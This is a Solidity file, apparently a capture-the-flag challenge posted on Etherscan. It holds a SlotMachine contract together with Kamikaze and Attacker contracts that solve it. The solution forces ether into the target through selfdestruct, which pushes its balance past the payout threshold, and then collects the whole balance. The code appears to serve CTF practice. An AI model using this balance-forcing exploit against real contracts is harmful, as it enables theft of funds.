/**
 *Submitted for verification at Etherscan.io on 2022-03-15
*/

pragma solidity 0.4.24;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract CtfFramework{
    
    event Transaction(address indexed player);

    mapping(address => bool) internal authorizedToPlay;
    
    constructor(address _ctfLauncher, address _player) public {
        authorizedToPlay[_ctfLauncher] = true;
        authorizedToPlay[_player] = true;
    }
    
    // This modifier is added to all external and public game functions
    // It ensures that only the correct player can interact with the game
    modifier ctf() { 
        require(authorizedToPlay[msg.sender], "Your wallet or contract is not authorized to play this challenge. You must first add this address via the ctf_challenge_add_authorized_sender(...) function.");
        emit Transaction(msg.sender);
        _;
    }
    
    // Add an authorized contract address to play this game
    function ctf_challenge_add_authorized_sender(address _addr) external ctf{
        authorizedToPlay[_addr] = true;
    }

}

contract SlotMachine is CtfFramework{

    using SafeMath for uint256;

    uint256 public winner;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        winner = 5 ether;
    }
    
    function() external payable ctf{
        require(msg.value == 1 szabo, "Incorrect Transaction Value");
        if (address(this).balance >= winner){
            msg.sender.transfer(address(this).balance);
        }
    }
    function boh() external view returns(uint256){
        return address(this).balance;
    }

}

contract Kamikaze{
    constructor(SlotMachine slotMachine) public payable{
        selfdestruct(address(slotMachine));
    }
}


contract Attacker{
    SlotMachine slotMachine;
     constructor(SlotMachine _slotMachine) public{
         slotMachine=_slotMachine;
     }

    function attack() public payable{
        if(address(slotMachine).balance<slotMachine.winner())
        {   
            uint256 weiToSend = slotMachine.winner()-address(slotMachine).balance;
            require(msg.value>=(weiToSend+1 szabo), "not enough ether to win!");
            (new Kamikaze).value(weiToSend)(slotMachine);
        }
        require(address(slotMachine).call.value(1 szabo)(), "slot failed");
        msg.sender.transfer(address(this).balance);
    }

    function() public payable{

    }

}